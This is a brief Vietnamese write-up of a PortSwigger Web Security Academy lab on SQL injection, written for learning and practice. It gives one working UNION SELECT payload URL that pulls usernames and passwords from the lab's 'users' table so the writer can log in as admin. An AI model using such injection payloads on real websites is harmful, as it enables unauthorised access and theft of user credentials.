# Lab: SQL injection UNION attack, retrieving data from other tables

**Lab URL:** [PortSwigger Lab](https://portswigger.net/web-security/union-attacks/lab-retrieve-data-from-other-tables)

## Mô tả

Trong lab này, website chứa một table với tên là "users". Việc của mình là tìm account của admin và login.

## Khai thác

Sử dụng UNION SELECT với payload, ta dễ dàng retrieve được data của bảng users:

![Database từ users table](./sqli-union-attack/database-users-table.jpg)

`Payload: "https://ac1c1fcf1ef5e8c8c0a17e340047008c.web-security-academy.net/filter?category=Accessories%27+UNION+SELECT+username,password+FROM+users--"`

## Kết quả

![Solved SQLi finding other table](./sqli-union-attack/solved-union-attack-finding-other-table.jpg)
